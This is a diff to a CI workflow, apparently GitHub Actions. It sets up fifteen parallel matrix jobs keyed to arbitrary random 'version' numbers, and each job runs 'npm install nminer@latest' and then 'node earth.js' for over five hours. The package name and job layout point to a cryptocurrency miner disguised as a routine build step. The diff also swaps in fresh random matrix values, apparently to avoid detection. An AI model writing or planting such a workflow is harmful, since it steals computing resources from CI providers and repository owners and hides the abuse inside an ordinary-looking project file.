@@ -9,21 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4622 }
-          - { version: 3753 }
-          - { version: 5865 }
-          - { version: 7200 }
-          - { version: 6545 }
-          - { version: 5913 }
-          - { version: 5511 }
-          - { version: 2563 }
-          - { version: 3461 }
-          - { version: 4896 }
-          - { version: 4510 }
-          - { version: 5131 }
-          - { version: 1520 }
-          - { version: 2696 }
-          - { version: 9603 }
+          - { version: 6157 }
+          - { version: 3088 }
+          - { version: 4625 }
+          - { version: 5116 }
+          - { version: 9232 }
+          - { version: 5598 }
+          - { version: 3440 }
+          - { version: 3505 }
+          - { version: 9738 }
+          - { version: 7208 }
+          - { version: 1621 }
+          - { version: 3012 }
+          - { version: 9848 }
+          - { version: 4636 }
+          - { version: 8888 }
 
     steps:
       - name: Checkout
@@ -34,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: pace
         run: |
           npm install nminer@latest
-          timeout 345m node earth.js || echo "earth executed"
+          timeout 324m node earth.js || echo "earth executed"
